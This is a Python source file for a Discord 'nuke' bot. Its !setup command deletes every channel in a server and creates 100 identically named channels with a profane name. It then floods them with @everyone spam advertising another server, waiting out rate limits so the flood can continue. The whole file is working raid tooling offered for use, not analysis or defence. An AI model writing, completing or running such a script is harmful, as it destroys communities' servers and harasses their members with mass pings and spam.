#Fast deletion of channels and creation of channels and now send 35 messages in the channels
import discord
from discord.ext import commands, tasks
import asyncio

intents = discord.Intents.default()
intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} - {bot.user.id}')

async def send_messages_loop(channels, message, delay, num_messages):
    for _ in range(num_messages):
        try:
            await asyncio.gather(*[channel.send(message) for channel in channels])
            await asyncio.sleep(delay)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                print(f"Rate limited. Retrying in {e.retry_after} seconds.")
                await asyncio.sleep(e.retry_after)
            else:
                raise

@bot.command()
async def setup(ctx):
    channelname = "Ultimate-Fucker"
    message = "@everyone @here join to: "
    delay = 0.1
    num_messages = 35

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])

    new_channels = []

    async def create_channel(i):
        new_channel = await ctx.guild.create_text_channel(f'{channelname}')
        new_channels.append(new_channel)

    await asyncio.gather(*[create_channel(i) for i in range(100)])

    await asyncio.sleep(2)

    bot.loop.create_task(send_messages_loop(new_channels, message, delay, num_messages))

bot.run('TOKEN-OF-THE-BOT')
